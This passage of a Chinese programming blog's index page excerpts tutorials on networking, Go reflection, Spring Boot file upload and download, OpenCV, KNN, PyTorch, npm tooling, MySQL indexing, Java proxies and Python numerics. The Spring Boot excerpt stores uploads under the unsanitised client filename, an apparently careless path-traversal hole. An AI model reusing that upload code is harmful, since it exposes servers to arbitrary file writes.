物理媒体：物理层通过各种传输媒体（如光纤、电缆、双绞线等）连接不同的计算机设备。数据传输：物理层的主要功能是确保原始的比特流数据能够在这些物理媒体上正确传输。透明传输：物理层提供了透明传输，即网络通信的各方不需要关心数据通路中具体的传输介质类型、相关标准以及通信协议的细节。数据编码：为了确保数据比特流能在相应的信道中正常传输，物理层需要对数据进行编码。不同的传输介质支持不同的数据编码类型，如归零码、非归零码、曼彻斯特码、差分曼彻斯特码等。数据传输管理：物理层还具有一定的数据传输管理功能，包括基于比特流的数据传输流量控制、差错控制、物理线路的激活和释放等。传输方式：物理层定义了数据的传输方式，包括单向通信、双向通信、单工、半双工、全双工等概念。 总的来说，物理层的核心任务是为数据链路层提供数据传输服务，保证比特流通过传输介质的正确传输。它根据所使用的传输介质制定相应的物理层协议，规定数据信号的编码方式、传输速率等相关参数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/862613e8fdec31be195581f33b2be4e2/" rel="bookmark">
			Golang 关于反射机制（一文了解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
Golang 反射比 C++ RTTI 要强大的多，但是比 .NET C#/VB/C++ 来说，它大约属于低阶反射支持的范畴。
但是 Golang 语言提供了相对强大的反射。
它总要比没有提供易用反射支持的要好的多，C++ 之中我们基本只能依赖模板、宏通过元编程来实现相对强大的反射机制。
Golang 反射弱的原因：
1、没有强大的动态编程，Emit 反射发出机制，
这会导致，很难实现真正意义上的 “Dynamic Proxy 动态代理框架”，这常常用于AOP切面编程，但的确可以通过如生成代码，或其它的解决方案来代替。
2、没有强大的动态表达式树编程，即：System.Linq.Expressions
相对于 Emit 嵌入平台IL（IL Assembly）来说要相对更舒服一些，但其接口的缺点是，拽写动态表达式 CodeDom 树比嵌入（IL Assembly）还要晦涩难懂一些，但学好规约树，深入理解计算机编程本质的童鞋，不会存在上手太困难的问题。
但是鱼合掌不可兼得，Golang 是一门AOT静态编译的语言，的确很难令反射支持 “动态反射并构建 Emit”。
这或许没有办法，但反射支持 Emit 动态编程才算是 “高阶反射”，否则都属于中低阶反射机制，这确实大家认同且不争的事实。
让我们展望一下下述例程代码：
反射：获取字段值、设置字段值
type Person struct { Name string Age int } func main() { p := Person{"小明", 20} t := reflect.TypeOf(p) fmt.Println("类型名:", t.Name()) // 获取值信息 v := reflect.ValueOf(p) fmt.Println("值信息:", v) // 修改值信息 v = reflect.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/862613e8fdec31be195581f33b2be4e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebc81750b6b3ce454619085311013e07/" rel="bookmark">
			【文件处理】spring boot 文件处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接收文件 @PostMapping public result&lt;String&gt; add(MultipartFile file) throws IOException { // 得到目标文件夹 File directory = new File("file"); //如果文件夹不存在就创建 if(!directory.exists()){ directory.mkdirs(); } //文件名称 String fileName = file.getOriginalFilename(); //得到文件的存放路径 ---directory.getCanonicalPath() 文件夹全路径 --- File.separator：分隔符 String filePath = directory.getCanonicalPath() + File.separator + fileName; // 创建新文件对象,指定文件路径为新路径 File desc = new File(filePath); // 将前端发过来的文件输送给新文件 完成存入 file.transferTo(desc); return result.success("success"); } 发送文件 @GetMapping("/{url}") public void pdf(@PathVariable String url, HttpServletResponse response) throws IOException { //文件所在文件夹 File directory = new File("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebc81750b6b3ce454619085311013e07/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96aa672ef2fa16db450d70114a25a53a/" rel="bookmark">
			【JS基础】对象的一些基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、 对象是什么二、对象的使用2.1. 对象声明语法2.2 对象属性的改操作2.3 对象属性的增对象属性的删操作2.4 查的另一种操作2.5 对象的遍历 三、内置对象Math3.1 random 函数3.2 ceil 函数3.3 floor 函数3.4 max 函数3.5 min 函数3.6 pow 函数3.7 abs 函数 总结 前言 JavaScript中的对象是一种强大而灵活的数据结构，它允许我们组织和存储数据以及执行各种操作。对象是一种复合数据类型，可以包含多个键值对，每个键值对之间通过冒号连接。在本文中，我们将探讨对象的一些基本使用方法，帮助初学者更好地理解和利用这一概念。
一、 对象是什么 对象（object）：JavaScript里的一种数据类型
可以理解为是一种无序的数据集合， 注意数组是有序的数据集合
用来描述某个事物，例如描述一个人
人有姓名、年龄、性别等信息、还有吃饭睡觉打代码等功能
如果用多个变量保存则比较散，用对象比较统一
比如描述 班主任 信息：
静态特征 (姓名, 年龄, 身高, 性别, 爱好) =&gt; 可以使用数字, 字符串, 数组, 布尔类型等表示
动态行为 (点名, 唱, 跳, rap) =&gt; 使用函数表示
二、对象的使用 2.1. 对象声明语法 声明方式1：
let 对象名={} 声明方式2：
let 对象名 = new Object() 示例代码：
let person = {} 实际开发中，我们多用花括号。 {} 是对象字面量
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96aa672ef2fa16db450d70114a25a53a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c4ddaa5b8d64deb5f88ceb32f5553f3/" rel="bookmark">
			13- OpenCV：霍夫检测：直线、圆检测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、霍夫变换简介
1、霍夫变换的原理
2、霍夫变换的优点
3、霍夫变换的缺点
4、霍夫变换的应用场景
5、使用霍夫变换的步骤
二、霍夫变换—直线检测
1、霍夫直线变换介绍
2、霍夫直线变换的例子
3、相关API学习（代码例子）
三、霍夫变换—圆检测
1、霍夫圆检测原理
2、相关API学习（代码例子）
一、霍夫变换简介 霍夫变换（Hough Transform）是一种在图像处理中常用的技术，用于检测图像中的直线、圆或其他形状。
在霍夫变换中，直线通常由两个参数表示：斜率和截距。对于每个图像中的点，都可以在参数空间中绘制出与该点相关的曲线。当多个点共线时，它们在参数空间中的曲线会相交于同一个点，从而形成一个峰值。通过寻找参数空间中的峰值，我们可以确定图像中存在的直线。
1、霍夫变换的原理 它的原理是将图像中的每个点转换为参数空间中的曲线或曲面，并通过对这些曲线或曲面进行累加来找到图像中的特定形状。
（1）霍夫空间：对于待检测的形状，霍夫变换将其在参数空间中表示。对于直线检测，参数空间通常是极坐标空间，其中两个参数分别表示直线的长度和角度。对于圆和椭圆检测，参数空间则包括圆心和半径或椭圆参数。
（2）累加过程：对于图像中的每个边缘点，通过遍历参数空间，将其转换为参数空间中的曲线或曲面。当多个边缘点共线或共圆时，在参数空间中会出现峰值。这些峰值表示了可能存在的形状。
（3）阈值和筛选：根据设定的阈值，选择参数空间中的峰值作为检测结果。通常选择峰值强度高于阈值的部分，并进行进一步的筛选和优化。
（4）反变换：根据检测到的参数，在原始图像中绘制出相应的形状。对于直线检测，可以通过计算两个端点的坐标；对于圆和椭圆检测，可以通过计算圆心和半径或椭圆参数。
通过以上步骤，霍夫变换可以在图像中检测出特定形状的位置和参数。
2、霍夫变换的优点 （1）霍夫变换是一种基于几何特征的图像处理方法，对于形状检测具有较好的鲁棒性。它不依赖于形状的大小、方向和位置，能够在图像中准确地检测出各种形状。
（2）霍夫变换可以应用于不同类型的形状检测，包括直线、圆、椭圆等。通过适当选择参数表示方式和累加过程，可以扩展到其他形状的检测。
（3）霍夫变换可以应用于图像中存在噪声或部分遮挡的情况下。通过合适的预处理和参数设置，可以提高对形状的检测准确性。
3、霍夫变换的缺点 （1）霍夫变换的计算复杂度较高，特别是对于大尺寸图像和复杂形状的检测。这会导致算法的执行时间较长，不适用于实时应用或对计算资源要求较高的场景。
（2）霍夫变换对图像中的噪声比较敏感，因此需要进行预处理来降低噪声的影响。这可能会引入额外的步骤和计算开销。
（3）霍夫变换对参数的选择较为敏感，不同形状的检测可能需要不同的参数设置。这对于非专业用户来说可能会增加使用的难度。
（4）霍夫变换在处理曲线或曲面交叉的情况下可能会出现误检测或漏检的问题。特别是当形状之间存在相似性或重叠时，可能会导致结果的不准确性。
总体而言，霍夫变换是一种强大的图像处理技术，但在实际应用中需要综合考虑其优点和缺点，并结合具体场景进行参数调整和算法改进。
4、霍夫变换的应用场景 （1）直线检测：霍夫变换最常用的应用之一是检测图像中的直线。通过将图像中的每个点转换为参数空间中的曲线，可以找到共线点形成的峰值，从而确定直线的位置和方向。
（2）圆检测：除了直线，霍夫变换也可以用于检测图像中的圆。通过将图像中的每个点转换为参数空间中的曲面，可以找到共圆心的曲面交点，从而确定圆的位置和半径。
（3）椭圆检测：类似地，霍夫变换还可以用于检测图像中的椭圆。通过将图像中的每个点转换为参数空间中的曲面，可以找到共椭圆参数的曲面交点，从而确定椭圆的位置、长轴和短轴。
（4）形状匹配：除了检测特定形状，霍夫变换还可以用于形状匹配。通过将待匹配形状在参数空间中表示，并与图像中的曲线或曲面进行匹配，可以找到与待匹配形状相似的图像区域。
5、使用霍夫变换的步骤 （1）边缘检测：首先对图像进行边缘检测，例如使用Canny边缘检测算法。这可以帮助减少噪声和提取出形状的边缘。
（2）参数空间设置：根据待检测的形状类型，选择合适的参数空间。对于直线检测，通常使用极坐标空间，其中两个参数分别表示直线的长度和角度。对于圆和椭圆检测，参数空间则包括圆心和半径或椭圆参数。
（3）累加过程：遍历边缘点，并将其转换为参数空间中的曲线或曲面。通过累加过程，找到在参数空间中出现峰值的位置，这些峰值表示可能存在的形状。
（4）阈值和筛选：根据设定的阈值，选择参数空间中的峰值作为检测结果。通常选择峰值强度高于阈值的部分，并进行进一步的筛选和优化。
（5）反变换：根据检测到的参数，在原始图像中绘制出相应的形状。对于直线检测，可以通过计算两个端点的坐标；对于圆和椭圆检测，可以通过计算圆心和半径或椭圆参数。
（6）参数调优：根据实际需求，可能需要对参数进行调优，以获得更好的检测结果。这包括阈值的选择、参数空间的分辨率等。
（7）结果分析和后处理：对于检测到的形状，可以进行进一步的分析和处理。例如，可以根据形状的位置和特征进行分类或其他操作。
需要注意的是：霍夫变换对图像中的噪声比较敏感，因此在应用之前通常需要进行预处理，如边缘检测或滤波操作。
二、霍夫变换—直线检测 1、霍夫直线变换介绍 （1）Hough Line Transform用来做直线检测
（2）前提条件 – 边缘检测已经完成 （cv::Canny，输入的是8位的图像可以是单通道或多通道，输出的是8位单通道的灰度图像，再通过threshold转化为二值化图像）
（3）平面空间到极坐标空间转换 极坐标也就是霍夫空间的坐标。
2、霍夫直线变换的例子 （1）对于任意一条直线上的所有点来说
（2）变换到极坐标中，从[0~360]空间，可以得到r的大小
（3）属于同一条直线上点在极坐标空(r, theta)必然在一个点上有最强的信号出现，根据此反算到平面坐标中就可以得到直线上各点的像素坐标。从而得到直线
（4）从平面坐标变换到霍夫空间（极坐标）
3、相关API学习（代码例子） （1）标准的霍夫变换 cv::HoughLines从平面坐标转换到霍夫空间，最终输出是极坐标空间；表示形式为：。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c4ddaa5b8d64deb5f88ceb32f5553f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f771027bae77fe5e8d3c38206ae926d6/" rel="bookmark">
			云风网（www.niech.cn）个人网站搭建（九）html静态菜单列表替换为接口请求动态数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前部署的网站 html 内容都是静态写死的，现在需要替换为接口获取数据展示
&lt;div class="col-lg-4 col-md-6 col-xs-12 active textCenter"&gt; &lt;div class="table wow fadeInUp" id="active-tb" data-wow-delay="1.2s"&gt; &lt;div class="title"&gt; &lt;h3&gt;&lt;a href="https://nodejs.org/en/about" target="_blank"&gt;Nodejs&lt;/a&gt;&lt;/h3&gt; &lt;/div&gt; &lt;ul class="description"&gt; &lt;p class="price-value"&gt;基于 Chrome V8 解析引擎的Js运行时环境。&lt;/p&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="col-lg-4 col-md-6 col-xs-12 active textCenter"&gt; &lt;div class="table wow fadeInUp" id="active-tb" data-wow-delay="1.2s"&gt; &lt;div class="title"&gt; &lt;h3&gt;&lt;a href="https://www.mongodb.com/try/download/community" target="_blank"&gt;mongodb&lt;/a&gt;&lt;/h3&gt; &lt;/div&gt; &lt;ul class="description"&gt; &lt;p class="price-value"&gt;前端开发人员普遍使用的数据库。&lt;/p&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="col-lg-4 col-md-6 col-xs-12 active textCenter"&gt; &lt;div class="table wow fadeInUp" id="active-tb" data-wow-delay="1.2s"&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f771027bae77fe5e8d3c38206ae926d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea13b2844d92e931b37dde96ee19f29e/" rel="bookmark">
			2.机器学习-K最近邻(k-Nearest Neighbor，KNN)分类算法原理讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2️⃣机器学习-K最近邻（k-Nearest Neighbor，KNN）分类算法原理讲解 个人简介一·算法概述二·算法思想2.1 KNN的优缺点 三·实例演示3.1电影分类3.2使用KNN算法预测 鸢(yuan)尾花 的种类3.3 预测年收入是否大于50K美元 个人简介 🏘️🏘️个人主页：以山河作礼。
🎖️🎖️:Python领域新星创作者，CSDN实力新星认证，CSDN内容合伙人，阿里云社区专家博主，新星计划导师，在职数据分析师。 🎉🎉免费学习专栏：
1. 《Python基础入门》——0基础入门
2.《Python网络爬虫》——从入门到精通
3.《Web全栈开发》——涵盖了前端、后端和数据库等多个领域
💕💕悲索之人烈焰加身，堕落者不可饶恕。永恒燃烧的羽翼，带我脱离凡间的沉沦。
一·算法概述 K-最近邻算法（K-Nearest Neighbor，简称KNN）是一种基于实例学习的算法，可以应用于分类和回归任务。作为一种非参数算法，KNN不对数据分布做任何假设，而是直接使用数据中的最近K个邻居的标签来预测新数据点的标签。
在KNN算法中，每个数据点都可以表示为一个n维向量，其中n是特征的数量。对于一个新的数据点，KNN算法会计算它与每个训练数据点之间的距离，并选择最近的K个训练数据点。对于分类问题，KNN算法会将这K个训练数据点中出现最多的类别作为预测结果。而对于回归问题，KNN算法会将这K个训练数据点的输出值的平均值作为预测结果。
在KNN算法中，K的取值是一个超参数，需要根据数据集的特点和算法的性能进行选择。通常情况下，较小的K值可以使模型更复杂，更容易受到噪声的影响，而较大的K值可以使模型更简单、更稳定，但可能会导致模型的欠拟合。因此，选择合适的K值对于KNN算法的性能至关重要。
二·算法思想 KNN（K-最近邻）算法是一种基于实例的分类方法，通过计算不同特征值之间的距离来进行分类。
1️⃣其核心思想是：
如果一个样本在特征空间中的k个最邻近的样本中的大多数属于某一个类别，则该样本也划分为这个类别。KNN算法中，所选择的邻居都是已经正确分类的对象。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。
2️⃣ KNN算法的主要步骤如下：
确定k值，即选取多少个最近邻居参与投票。计算待分类样本与已知分类样本之间的距离，通常使用欧氏距离作为距离度量。对距离进行排序，找出最近的k个邻居。统计这k个邻居中各个类别的数量，将数量最多的类别作为待分类样本的类别。 3️⃣KNN算法涉及3个主要因素：
实例集、距离或相似的衡量、k的大小。实例集是指已知分类的样本集合；距离或相似的衡量是指计算样本之间距离的方法，如欧氏距离；k的大小是指选取多少个最近邻居参与投票，k值的选择会影响分类结果的准确性。
一个实例的最近邻是根据标准欧氏距离定义的。更精确地讲，把任意的实例x表示为下面的特征向量：
其中ar(x)表示实例x的第r个属性值。那么两个实例xi和xj间的距离定义为d(xi,xj)，其中：
2.1 KNN的优缺点 1️⃣K-最近邻算法（KNN）的优点：
简单易懂：KNN算法的原理和实现都非常简单，容易理解和掌握。
非参数化：KNN是一种非参数化算法，不需要对数据分布做任何假设。
对异常值不敏感：KNN能够有效处理包含异常值的数据。
多用途：适用于分类和回归问题。
高维数据处理：可以处理高维特征空间的数据。
非线性问题处理：能够适应非线性的数据分布。
高度可解释性：结果直观，易于解释。
2️⃣KNN算法的缺点：
效率低：在大型数据集上计算距离时效率较低，尤其是在高维数据中。
对噪声敏感：训练数据中的噪声可能影响最近邻的选择，导致预测结果不准确。
K值选择：K值的选择对算法性能有很大影响，需要通过实验来确定最佳值。
距离度量：选择合适的距离度量方法对算法性能至关重要。
特征缩放敏感：需要对特征进行归一化或标准化，否则可能导致某些特征过于主导。
缺失值处理：处理缺失值较为困难，需要采取特定策略来应对。
解释性差：由于是基于实例的预测，相对于其他模型来说解释性较差。
三·实例演示 3.1电影分类 1.导入数据分析三剑客
import numpy as np import pandas as pd import matplotlib.pyplot as plt 2.导入KNN算法
# 谷歌的机器学习库 from sklearn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea13b2844d92e931b37dde96ee19f29e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/238f68b2964927775d6d2c95a400be0d/" rel="bookmark">
			深度学习技术栈 —— 用Pytorch搭建神经网络识别数字(Kaggle实战)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习技术栈 —— 用Pytorch搭建神经网络识别数字 （Kaggle实战） 一、项目信息1.1 参考文章 二、搭建过程2.1 逻辑回归2.2 Artificial Neural Network (ANN)2.3 Convolutional Neural Network (CNN)2.4 训练过程总结 一、项目信息 Kaggle比赛地址：Digit Recognizer - Kaggle
1.1 参考文章 1.1 参考文章或视频链接[1] 纯手写：《纯Python搭建神经网络并进行数字识别 》[2] Keras：《用Keras搭建神经网络 》[3] Kaggle金牌Pytorch，本文的代码来源：Pytorch Tutorial for Deep Learning Lovers
如果访问较慢的话，我也上传了一份到CSDN中(0积分)：digit-recognizer-kaggle - CSDN资源 二、搭建过程 2.1 逻辑回归 这种方式非常的原始
2.2 Artificial Neural Network (ANN) 也就是全连接神经网络，只不过多加了几层。
2.3 Convolutional Neural Network (CNN) 卷积神经网络，在第2000轮迭代时，就达到了98%的准确率。
2.4 训练过程总结 详细代码过程我就不再赘述了，网上有很多关于逻辑回归，神经网络及CNN的代码与讲解。
# (1) creating the model class. model = CNNModel() # Create CNN # (2) creating loss func.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/238f68b2964927775d6d2c95a400be0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1d4dffaa690f7ac01928ea80fbc3eb4/" rel="bookmark">
			记录--npm, npx, cnpm, yarn, pnpm梭哈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里给大家分享我在网上总结出来的一些知识，希望对大家有所帮助 依赖管理解决了在软件开发过程中管理和协调各种依赖项的问题，简化了开发流程，提高了项目的可靠性、可维护性和可重复性。它们帮助开发人员更高效地管理项目的依赖关系，减少了潜在的错误和冲突，并提供了更好的开发体验。
常用的依赖管理 在 JavaScript 生态系统中，有多种工具可用于管理项目的依赖项。
npm(Node Package Manager)：npm 是 Node.js 官方提供的包管理器，用于安装、管理和发布 JavaScript 包。它是 Node.js 安装时默认包含的工具。通过 npm install 命令可以安装项目依赖。 npm install package-name pnpm：pnpm 是一个快速、磁盘空间效率高的包管理器。与 npm 不同，pnpm 采用了符号链接的方式共享依赖项，因此在项目之间共享依赖时可以节省磁盘空间。pnpm 的命令与 npm 类似。 pnpm install package-name yarn：yarn 是由 Facebook 开发的另一个包管理器，旨在提供更快、更可靠的依赖管理。它具有与 npm 类似的功能，但执行速度更快，并且具有一些额外的功能，例如离线模式和锁定文件。与 npm 不同，yarn 使用 yarn add 命令来安装依赖。 yarn add package-name npx：npx 是 npm 5.2.0 版本及以上内置的命令行工具，用于执行项目安装的依赖项中的可执行文件。它可以临时安装依赖项并运行其中的命令，而无需全局安装。 npx command-name cnpm：cnpm 是淘宝镜像提供的 npm 的镜像版本，用于加速国内用户对 npm 包的安装和下载速度。它是通过将 npm 的源地址配置为淘宝的源地址来实现的。与 npm 相比，使用 cnpm 可以更快地安装依赖项。 常用依赖管理的对比 准确地说，npx 并不是一个专门的依赖管理工具，而是 npm 附带的一个命令行工具，用于临时执行项目依赖中的可执行文件，而无需全局安装。以下对其它常用依赖管理工具的对比，npx在后续小节会提到期妙用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1d4dffaa690f7ac01928ea80fbc3eb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a642a89b2bd78180ff5ae88a77367175/" rel="bookmark">
			MySQL 索引优化：深入探索自适应哈希索引的奥秘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在数据库管理系统中，索引优化是提高查询性能的关键所在。MySQL 作为最流行的开源关系型数据库管理系统之一，提供了多种索引类型以满足不同查询场景的需求。其中，自适应哈希索引（Adaptive Hash Index，AHI）是 InnoDB 存储引擎提供的一种高级索引优化技术，它能够在特定情况下显著提升查询性能。本文将深入探讨自适应哈希索引的工作原理、使用场景以及如何充分利用它进行性能优化。
在 MySQL 中，索引是用来加速数据检索速度的一种数据结构。通常我们最熟悉的是 B-tree 索引，但 MySQL 的 InnoDB 存储引擎还提供了其他类型的索引，包括自适应哈希索引。
一、什么是自适应hash索引 先来回顾下什么是hash索引
哈希索引（Hash Index）：
哈希索引基于哈希表实现，它将索引键值通过哈希函数转换为一个位置，然后在该位置存储相应的数据或数据指针。由于哈希索引可以几乎在 O(1) 时间复杂度内完成查找操作，因此在某些场景下它比 B-tree 索引更快。
然而，哈希索引有几个显著的缺点：
它不支持范围查询，因为哈希索引不存储数据的物理顺序信息。哈希索引不支持部分键匹配查询和排序操作。当哈希冲突较多时，性能会下降。哈希索引的构建和维护通常需要额外的内存开销。 在 MySQL 中，InnoDB 存储引擎并不直接支持用户创建的哈希索引。但是，InnoDB 使用哈希索引作为其内部数据结构的一部分，例如用于加速某些类型的查找。
自适应哈希索引（Adaptive Hash Index，AHI）：
自适应哈希索引是 InnoDB 存储引擎特有的一个功能，它是为了优化某些热点数据的查询性能而自动构建的。自适应哈希索引不同于传统的哈希索引，因为它是自动和动态的：InnoDB 会根据查询模式和数据访问频率自动决定是否构建哈希索引，并且会根据数据的变化和查询模式的变化动态地调整哈希索引。
自适应哈希索引的工作原理是，当 InnoDB 注意到某些索引值被频繁地以等值查询的方式访问时，它会在内存中为这些值建立哈希索引，从而加速后续的等值查询。这个过程是自动的，不需要用户干预。
自适应哈希索引的优点包括：
自动优化：自适应哈希索引会自动构建和维护，不需要用户显式创建或管理。性能提升：对于某些等值查询，自适应哈希索引可以显著减少查找时间，哈希索引，查询消耗 O(1）降低对二级索引树的频繁访问资源。 然而，自适应哈希索引也有一些限制和考虑因素：
内存消耗： 自适应哈希索引完全在内存中构建，因此需要足够的内存资源。在高负载下，它可能会消耗大量的内存。不可预测性：由于是基于运行时查询模式的，所以哈希索引的存在和组成是不可预测的。不适用于所有查询：自适应哈希索引主要优化等值查询，对于范围查询或排序操作没有帮助。hash自适应索引会占用innodb buffer pool； 总的来说，自适应哈希索引是 InnoDB 存储引擎为了提高特定类型查询性能而自动构建的一种内存中的哈希索引结构。它可以根据查询模式和数据访问频率自动调整，以优化数据库的性能。
二、自适应哈希索引的工作原理 自适应哈希索引是 InnoDB 存储引擎内部实现的一种特殊索引结构，它是基于内存中的哈希表构建的。与传统的 B-tree 索引不同，哈希索引使用哈希函数将索引键值映射到哈希表中，从而实现了 O(1) 时间复杂度的快速查找。这意味着在等值查询场景下，自适应哈希索引能够提供比 B-tree 索引更快的查找速度。
自适应散列索引（AHI）使InnoDB在系统上执行更像内存数据库，该功能由innodb_adaptive_hash_index 配置启用。
Innodb存储引擎会监控对表上二级索引的查找，如果发现某二级索引被频繁访问，innodb就会使用索引键的前缀建立一个哈希索引。将索引值转换为一种指针，便于直接访问，带来速度的提升。
经常访问的二级索引数据会自动被生成到hash索引里面去(最近连续被访问三次的数据)，自适应哈希索引通过缓冲池的B+树构造而来，因此建立的速度很快。
然而，哈希索引并不适用于所有查询场景。由于哈希索引不存储数据的物理顺序信息，因此它无法支持范围查询和排序操作。
此外，哈希索引的构建和维护需要额外的内存开销。为了平衡性能和资源消耗，InnoDB 存储引擎会根据查询模式和数据访问频率动态地构建和维护自适应哈希索引。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a642a89b2bd78180ff5ae88a77367175/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d335774580050dde33586336da768d9/" rel="bookmark">
			Java 设计者模式以及与Spring关系(四) 代理模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
简介:
23设计者模式以及重点模式
代理模式（Proxy Pattern）
静态代理示例
spring中应用
动态代理
1.基于JDK的动态代理
target.getClass().getInterfaces()作用
内名内部类写法(更简洁，但不推荐)
2.基于CGLIB实现
spring中应用
简介: 本文是个系列一次会出两个设计者模式作用，如果有关联就三个，除此外还会讲解在spring中作用。
23设计者模式以及重点模式 我们都知道设计者模式有3类23种设计模式，标红是特别重要的设计者模式建议都会，而且熟读于心，标蓝是指其次重要建议也要明白。
（1）创建型模式：单例模式、抽象工厂模式、构建者模式、工厂模式、原型模式。
（2）结构型模式：适配器模式、桥接模式、装饰模式、组合模式、外观模式、享元模式、代理模式。
（3）行为型模式：访问者模式、模版方法模式、命令模式、迭代器模式、观察者模式、中介者模式、备忘录模式、解释器模式、状态模式、策略模式、职责链模式。
代理模式（Proxy Pattern） 代理模式是一种结构型设计模式，它通过提供一个替代对象（代理）来控制对另一个对象的访问。代理对象与原始对象实现相同的接口，这使得代理可以站在原始对象的位置被客户端使用，同时代理还可以在访问原始对象前后执行额外的操作，例如访问控制、延迟初始化、日志记录、监控等。
代理模式分为两类，常说的一般是动态代理。
类型：
静态代理：手动创建代理类。 使用场景：在程序创建之前，代理类创建好的，代理目标是明确的可以使用静态代理。
动态代理：在运行时动态创建代理类，Java 中可通过 Proxy 类和 InvocationHandler 接口实现。 使用场景：让编程人员在不修改对象代码的情况下，为这个对象添加额外的功能或者限制
静态代理示例 主要就是给金士顿的U盘算完各种折扣后75给淘宝，淘宝全都加25卖给客户，业务就是这个业务。
卖U盘的接口，定义一个U盘卖多少钱
制作优盘厂商实现类
代理类，淘宝类，在内部实现类中创建目标类对象引用，引用调用目标类方法，实现静态代理
自己进行购买
spring中应用 不知道你看出来了吗，这个像不像是我们spring框架中一个实现类调用另一个实现类方法。
动态代理 如果目标类很多呢，只是静态代理，那么需要创建的代理类就很多，比如上面的卖u盘例子，本来淘宝只卖金士顿，但是来个叫李帅帅的U盘厂家，但其实你只想想给这两个厂家做一样统一逻辑操作，比如还是加25块钱卖出去，这是就需要写第二个静态代理类，但如果有100个商品呢，这时就需要使用动态代理统一加载。
动态代理有两种实现方式
1.基于JDK的动态代理 目标类
动态代理类
method.invoke(target,args) 可以看做target.method(args)
实现类调用
target.getClass().getClassLoder() 得到目标类的实现类的类加载器
target.getClass().getInterfaces()它能够获得所实现这个对象的接口。其实这个接口不一定是目标类实现的接口，你看mybatis实现源码，接口就是任意接口。但是你要保证这第二个参数是个接口。
target.getClass().getInterfaces()作用 如果不懂这块的可以看看我这块，懂就略过
内名内部类写法(更简洁，但不推荐) 方法抽取放在一个别的类中方便使用
2.基于CGLIB实现 动态代理有两种实现方式，一种是上述jdk的，核心是需要动态代理的目标类必须有接口还有一种是基于外部第三方类库的cglib,创建代理对象cglib不要求实现类也就是目标类去实现接口，cglib核心要求是继承目标类不能是finall。
cglib 经常被应用在框架中，例如 Spring，Hibernat 等。cglib的代理效率高于 Jdk。对于 cglib 一般的开发中并不使用。做了一个了解就可以。
引入Jar包
&lt;!--引入cglib依赖--&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d335774580050dde33586336da768d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2ee45653a86e0816d04859e51448764/" rel="bookmark">
			Python学习笔记--数值与字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文内容摘自朱雷老师著《Python工匠》一书内容，为学习笔记摘录。
一、数值基础
在Python中，一共存在3种内置数值类型：整型（int）、浮点型（float）、复数类型（complex）。创建如下：
# 定义一个整型 score = 100 # 定义一个浮点型 temp = 37.2 # 定义一个复数 com = 3+4j # 创建一个复数 z = complex(3, 4) # 创建一个复数，实部为3，虚部为4 print(z) # 输出：3+4j 在大多数情况下，主要使用前两种类型：int和float。二者之间可以通过个值得内置方法进行转换：
&gt;&gt;&gt; i = 1_00_000_0000
&gt;&gt;&gt; i
1000000000
&gt;&gt;&gt; j = 2_345_5678
&gt;&gt;&gt; j
23455678
&gt;&gt;&gt; 在定义数字字面量时，如果数字特别长，可以通过插入下划线 _ 分隔符来让它变得更易读，如：
# 以“千”为单位分割数字
&gt;&gt;&gt; i = 1_000_000_000
&gt;&gt;&gt; i
1000000000
# 其实，可以随意位数间隔，比如
&gt;&gt;&gt; j = 2_345_5678
&gt;&gt;&gt; j
23455678
&gt;&gt;&gt; 一个问题：浮点数精度
如果在Python命令行输入0.1 + 0.
